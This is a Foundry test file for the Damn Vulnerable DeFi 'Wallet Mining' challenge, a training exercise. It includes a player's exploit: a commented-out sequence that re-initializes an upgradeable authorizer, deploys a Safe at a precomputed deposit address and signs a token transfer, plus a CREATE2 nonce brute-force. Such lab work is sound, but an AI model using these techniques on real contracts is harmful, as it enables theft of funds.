// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";
import {Attack} from "./Attack.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        // authorizer 프록시로 배포
        // 구현체를 교체하는 것이 가능한지? => upgrader가 아니면 구현체 교체 불가
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        // safe 구현체 배포
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        // safe 프록시 팩토리 배포
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay(); // 1 DVT
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        Attack attack = new Attack(player, user, address(authorizer), address(walletDeployer), address(token), ward, userPrivateKey);
        
        // Safe safeWallet = Safe(payable(USER_DEPOSIT_ADDRESS));
        // // 1. WalletDeployer에서 1DVT 획득
        // // AuthorizerUpgradeable의 wards[player][USER_DEPOSIT_ADDRESS]를 1로 등록
        // address[] memory wards = new address[](1);
        // wards[0] = player;

        // address[] memory aims = new address[](1);
        // aims[0] = USER_DEPOSIT_ADDRESS;

        // authorizer.init(wards, aims);

        // // deploy safe wallet initializer
        // uint256 saltNonce = 13;
        // address[] memory owners = new address[](1);
        // owners[0] = user;

        // bytes memory initializer = abi.encodeCall(
        //     Safe.setup,
        //     (
        //         owners,              // [user]
        //         1,                   // threshold 1-of-1
        //         address(0),          // to
        //         "",                  // data
        //         address(0),          // fallbackHandler
        //         address(0),          // paymentToken
        //         0,                   // payment
        //         payable(address(0))  // paymentReceiver
        //     )
        // );

        // // WalletDeplyer에서 drop 호출하여 1DVT 획득과 동시에 safe wallet 배포
        // walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce);

        // // 1DVT ward에게 전송
        // token.transfer(ward, initialWalletDeployerTokenBalance);

        // // 2. 2000만 DVT 회수하기
        // // call execTransaction to get back 2000만 DVT to user

        // // Safe 지갑이 실행할 내용 : 2000만 DVT를 user에게 전송하는 calldata
        // bytes memory transferDVTtoUser = abi.encodeCall(
        //     token.transfer,
        //     (user, DEPOSIT_TOKEN_AMOUNT)
        // );

        // // user(=Safe owner)가 서명할 tx hash
        // uint256 nonce = safeWallet.nonce();
        // bytes32 txHash = safeWallet.getTransactionHash(
        //     address(token),        // DVT 주소
        //     0,                  // no ether
        //     transferDVTtoUser,   // DVT.transfer(user, DEPOSIT_TOKEN_AMOUNT)
        //     Enum.Operation.Call,
        //     0,
        //     0,
        //     0,
        //     address(0),
        //     payable(address(0)),
        //     nonce
        // );

        // // user(=Safe owner)가 tx hash에 서명
        // (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        // bytes memory signature = abi.encodePacked(r, s, v);


        // // player가 user의 서명을 사용하여 execTransaction 호출
        // safeWallet.execTransaction(
        //     address(token),
        //     0,
        //     transferDVTtoUser,
        //     Enum.Operation.Call,
        //     0,
        //     0,
        //     0,
        //     address(0),
        //     payable(address(0)),
        //     signature
        // );
    }

    function test_guessNonce() public {
        address[] memory owners = new address[](1);
        owners[0] = user;

        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (
                owners,              // [user]
                1,                   // threshold 1-of-1
                address(0),          // to
                "",                  // data
                address(0),          // fallbackHandler
                address(0),          // paymentToken
                0,                   // payment
                payable(address(0))  // paymentReceiver
            )
        );

        bytes32 initCodeHash = keccak256(abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(address(singletonCopy)))
        ));

        for (uint256 nonce = 0; nonce < 100_000; nonce++){
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
            address predicted = vm.computeCreate2Address(salt, initCodeHash, address(proxyFactory));

            if (predicted == USER_DEPOSIT_ADDRESS){
                console.log("nonce found", nonce);
                return;
            }
        }
        revert("nonce not found");

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}
